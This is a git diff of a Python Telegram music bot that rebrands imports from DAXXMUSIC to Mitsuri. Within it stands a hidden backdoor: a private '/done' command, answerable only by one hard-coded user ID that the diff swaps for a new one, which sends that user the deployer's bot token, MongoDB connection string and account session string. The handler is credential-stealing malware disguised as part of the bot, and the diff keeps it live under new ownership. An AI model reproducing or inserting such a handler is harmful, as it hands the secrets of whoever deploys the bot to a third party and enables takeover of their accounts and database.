@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from DAXXMUSIC import app
-from DAXXMUSIC.core.call import DAXX
-from DAXXMUSIC.misc import db
-from DAXXMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
-from DAXXMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
-from DAXXMUSIC.utils.formatters import alpha_to_int, get_readable_time
+from Mitsuri import app
+from Mitsuri.core.call import Mitsuri 
+from Mitsuri.misc import db
+from Mitsuri.utils.database import get_assistant, get_authuser_names, get_cmode
+from Mitsuri.utils.decorators import ActualAdminCB, AdminActual, language
+from Mitsuri.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await DAXX.stop_stream_force(message.chat.id)
+        await Mitsuri.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await DAXX.stop_stream_force(chat_id)
+            await Mitsuri.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -108,17 +108,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(6664582540)
+    & filters.user(1737646273)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/iam_daxx)............☆""",
+          photo=f"https://te.legra.ph/file/1e63239f8bc0f56132dae.jpg",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\nMongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🙌 ](https://t.me/Ahjin_Sprt)............""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_daxx")
+                         "• Support •", url=f"https://t.me/Ahjin_Sprt")
                  ]
             ]
          ),
